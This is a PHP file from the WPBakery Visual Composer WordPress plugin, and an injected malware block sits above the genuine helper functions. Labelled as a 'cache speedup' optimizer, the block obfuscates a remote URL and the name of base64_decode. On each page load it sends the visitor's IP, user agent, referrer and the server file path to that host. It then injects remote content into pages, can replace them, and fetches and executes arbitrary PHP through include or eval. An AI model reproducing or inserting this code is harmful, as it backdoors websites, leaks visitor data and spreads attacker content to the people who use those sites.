<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }















/**
 * WPBakery Visual Composer Main manager.
 *
 * @package WPBakeryVisualComposer
 * @since   4.2
 */
if ( ! function_exists( 'vc_manager' ) ) {
	/**
	 * Visual Composer manager.
	 *
	 * @return Vc_Manager
	 */
	function vc_manager() {
		global $vc_manager;
		return $vc_manager;
	}
}
if ( ! function_exists( 'visual_composer' ) ) {
	/**
	 * Visual Composer instance.
	 *
	 * @return Vc_Base
	 */
	function visual_composer() {
		return vc_manager()->vc();
	}
}
if ( ! function_exists( 'vc_mapper' ) ) {
	/**
	 * Shorthand for Vc Mapper.
	 *
	 * @return Vc_Mapper
	 */
	function vc_mapper() {
		return vc_manager()->mapper();
	}
}
if ( ! function_exists( 'vc_settings' ) ) {
	/**
	 * Shorthand for Visual composer settings.
	 *
	 * @return Vc_Settings
	 */
	function vc_settings() {
		return vc_manager()->settings();
	}
}
if ( ! function_exists( 'vc_license' ) ) {
	/**
	 * Get License manager
	 *
	 * @return Vc_License
	 */
	function vc_license() {
		return vc_manager()->license();
	}
}
if ( ! function_exists( 'vc_automapper' ) ) {
	function vc_automapper() {
		return vc_manager()->automapper();
	}
}
if ( ! function_exists( 'vc_frontend_editor' ) ) {
	/**
	 * Shorthand for VC frontend editor
	 *
	 * @return Vc_Frontend_Editor
	 */
	function vc_frontend_editor() {
		return vc_manager()->frontendEditor();
	}
}
if ( ! function_exists( 'vc_backend_editor' ) ) {
	/**
	 * Shorthand for VC frontend editor
	 *
	 * @return Vc_Backend_Editor
	 */
	function vc_backend_editor() {
		return vc_manager()->backendEditor();
	}
}
if ( ! function_exists( 'vc_updater' ) ) {
	function vc_updater() {
		return vc_manager()->updater();
	}
}
if ( ! function_exists( 'vc_is_network_plugin' ) ) {
	/**
	 * Vc is network plugin or not.
	 *
	 * @return bool
	 */
	function vc_is_network_plugin() {
		return vc_manager()->isNetworkPlugin();
	}
}
if ( ! function_exists( 'vc_path_dir' ) ) {
	/**
	 * Get file/directory path in Vc.
	 *
	 * @param string $name - path name
	 * @param string $file
	 * @return string
	 */
	function vc_path_dir( $name, $file = '' ) {
		return vc_manager()->path( $name, $file );
	}
}
if ( ! function_exists( 'vc_asset_url' ) ) {
	/**
	 * Get full url for assets.
	 *
	 * @param string $file
	 * @return string
	 */
	function vc_asset_url( $file ) {
		return vc_manager()->assetUrl( $file );
	}
}
if ( ! function_exists( 'vc_upload_dir' ) ) {
	/**
	 * Temporary files upload dir;
	 *
	 * @return string
	 */
	function vc_upload_dir() {
		return vc_manager()->uploadDir();
	}
}
if ( ! function_exists( 'vc_template' ) ) {
	function vc_template( $file ) {
		return vc_path_dir( 'TEMPLATES_DIR', $file );
	}
}
if ( ! function_exists( 'vc_post_param' ) ) {
	/**
	 * Get param value from $_POST if exists.
	 *
	 * @param $param
	 * @param $default
	 * @return null|string - null for undefined param.
	 */
	function vc_post_param( $param, $default = null ) {
		return isset( $_POST[$param] ) ? $_POST[$param] : $default;
	}
}
if ( ! function_exists( 'vc_get_param' ) ) {
	/**
	 * Get param value from $_GET if exists.
	 *
	 * @param $param
	 * @param $default
	 * @return null|string - null for undefined param.
	 */
	function vc_get_param( $param , $default = null) {
		return isset( $_GET[$param] ) ? $_GET[$param] : $default;
	}
}
if ( ! function_exists( 'vc_is_frontend_editor' ) ) {
	function vc_is_frontend_editor() {
		return vc_mode() === 'admin_frontend_editor';
	}
}
if ( ! function_exists( 'vc_is_page_editable' ) ) {
	function vc_is_page_editable() {
		return vc_mode() == 'page_editable';
	}
}
if ( ! function_exists( 'vc_action' ) ) {
	/**
	 * Get VC special action param.
	 *
	 * @return string|null
	 */
	function vc_action() {
		$vc_action = null;
		if ( isset( $_GET['vc_action'] ) ) $vc_action = $_GET['vc_action'];
		elseif ( isset( $_POST['vc_action'] ) ) $vc_action = $_POST['vc_action'];
		return $vc_action;
	}
}
if ( ! function_exists( 'vc_is_inline' ) ) {
	/**
	 * Get is inline or not.
	 *
	 * @return bool
	 */
	function vc_is_inline() {
		global $vc_is_inline;
		if ( is_null( $vc_is_inline ) ) {
			$vc_is_inline = ( isset( $_GET['vc_action'] ) && $_GET['vc_action'] === 'vc_inline' ) ||
			  ( isset( $_GET['vc_inline'] ) || isset( $_POST['vc_inline'] ) );
		}
		return $vc_is_inline;
	}
}
if ( ! function_exists( 'vc_is_frontend_ajax' ) ) {
	function vc_is_frontend_ajax() {
		return vc_post_param( 'vc_inline' ) == 'true' || vc_get_param( 'vc_inline' );
	}
}
function vc_is_editor() {
	return vc_is_frontend_editor();
}

function vc_value_from_safe( $value, $encode = false ) {
	$value = preg_match( '/^#E\-8_/', $value ) ? rawurldecode( base64_decode( preg_replace( '/^#E\-8_/', '', $value ) ) ) : $value;
	if ( $encode ) $value = htmlentities( $value, ENT_COMPAT, 'UTF-8' );
	return $value;
}

function vc_disable_automapper( $disable = true ) {
	vc_automapper()->setDisabled( $disable );
}

function vc_automapper_is_disabled() {
	return vc_automapper()->disabled();
}

function vc_get_dropdown_option( $param, $value ) {
	if ( $value === '' && is_array( $param['value'] ) ) $value = array_shift( $param['value'] );
	$value = preg_replace( '/\s/', '_', $value );
	return ( $value !== '' ? $value : '' );
}

function vc_get_css_color( $prefix, $color ) {
	$rgb_color = preg_match( '/rgba/', $color ) ? preg_replace( array( '/\s+/', '/^rgba\((\d+)\,(\d+)\,(\d+)\,([\d\.]+)\)$/' ), array( '', 'rgb($1,$2,$3)' ), $color ) : $color;
	$string = $prefix . ':' . $rgb_color . ';';
	if ( $rgb_color !== $color ) $string .= $prefix . ':' . $color . ';';
	return $string;
}

function vc_shortcode_custom_css_class( $param_value, $prefix = '' ) {
	$css_class = preg_match( '/\s*\.([^\{]+)\s*\{\s*([^\}]+)\s*\}\s*/', $param_value ) ? $prefix . preg_replace( '/\s*\.([^\{]+)\s*\{\s*([^\}]+)\s*\}\s*/', '$1', $param_value ) : '';
	return $css_class;
}

/**
 * Plugin name for VC.
 *
 * @since 4.2
 * @return string
 */
function vc_plugin_name() {
	return vc_manager()->pluginName();
}